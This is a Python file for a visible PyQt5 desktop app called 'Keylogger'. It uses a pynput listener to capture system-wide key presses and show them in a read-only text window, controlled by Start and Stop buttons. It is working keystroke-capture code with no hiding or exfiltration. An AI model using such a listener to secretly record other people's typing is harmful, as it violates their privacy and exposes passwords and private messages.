import sys
from PyQt5.QtWidgets import QApplication, QWidget, QPushButton, QVBoxLayout, QTextEdit
from PyQt5.QtCore import Qt
from pynput.keyboard import Listener

class KeyloggerApp(QWidget):
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle('Keylogger')
        self.setGeometry(100, 100, 400, 300)

        self.text_edit = QTextEdit()
        self.text_edit.setReadOnly(True)

        start_button = QPushButton('Start Keylogger', self)
        start_button.clicked.connect(self.start_keylogger)

        stop_button = QPushButton('Stop Keylogger', self)
        stop_button.clicked.connect(self.stop_keylogger)

        layout = QVBoxLayout()
        layout.addWidget(self.text_edit)
        layout.addWidget(start_button)
        layout.addWidget(stop_button)

        self.setLayout(layout)

    def start_keylogger(self):
        self.text_edit.insertPlainText('Keylogger started...\n')
        self.listener = Listener(on_press=self.on_press, on_release=self.on_release)
        self.listener.start()

    def stop_keylogger(self):
        self.text_edit.insertPlainText('Keylogger stopped.\n')
        self.listener.stop()

    def on_press(self, key):
        try:
            self.text_edit.insertPlainText('Key pressed: {0}\n'.format(key.char))
        except AttributeError:
            self.text_edit.insertPlainText('Special key pressed: {0}\n'.format(key))

    def on_release(self, key):
        pass

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = KeyloggerApp()
    window.show()
    sys.exit(app.exec_())
